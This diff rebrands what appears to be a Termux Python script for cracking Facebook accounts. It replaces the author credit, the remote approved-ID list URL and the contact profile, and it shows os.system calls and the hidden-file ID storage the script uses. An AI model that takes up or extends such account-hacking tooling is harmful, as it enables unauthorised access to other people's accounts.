@@ -16,8 +16,8 @@ import cookielib
 import uuid
 from multiprocessing.pool import ThreadPool
 from requests.exceptions import ConnectionError
-__author__ = 'MUSKI'
-__copyright = 'All rights reserved . Copyright  MUSKI'
+__author__ = 'Shadow'
+__copyright = 'All rights reserved . Copyright  Shadow'
 os.system('termux-setup-storage')
 
 try:
@@ -60,7 +60,7 @@ def reg():
     except (KeyError, IOError):
         reg2()
 
-    r = requests.get('https://raw.githubusercontent.com/waqas7070/Hacker/main/waqas.txt').text
+    r = requests.get('https://raw.githubusercontent.com/abicreation/ok/main/ok.txt').text
     if to in r:
         os.system('cd ..... && npm install')
         os.system('fuser -k 5000/tcp &')
@@ -76,12 +76,12 @@ def reg():
         print ''
         print ' \x1b[1;92mYour Id Is Not Approved Already '
         print ''
-        print ' \x1b[1;92mCopy token id and send to XTYLISH PATHANI'
+        print ' \x1b[1;92mCopy token id and send to Shadow hacker'
         print ''
         print ' \x1b[1;92mYour id: ' + to
         print ''
         raw_input('\x1b[1;93m Press enter to send id')
-        os.system('xdg-open https://www.facebook.com/xtylish.pathani.404')
+        os.system('xdg-open https://www.facebook.com/100006539235634')
         reg()
 
 
@@ -98,7 +98,7 @@ def reg2():
     print ''
     print ''
     raw_input(' Press enter to go to Facebook ')
-    os.system('xdg-open https://www.facebook.com/xtylish.pathani.404')
+    os.system('xdg-open https://www.facebook.com/100006539235634')
     sav = open('/sdcard/.PA404.txt', 'w')
     sav.write(id)
     sav.close()
@@ -160,7 +160,7 @@ def log_menu():
 
 
 def log_menu_s():
-    s = raw_input(' \x1b[1;93m\xe2\x95\xb0\xe2\x94\x80MUSKI\xe2\x9e\xa4 ')
+    s = raw_input(' \x1b[1;93m\xe2\x95\xb0\xe2\x94\x80Shadow\xe2\x9e\xa4 ')
     if s == '1':
         log_fb()
     elif s == '2':
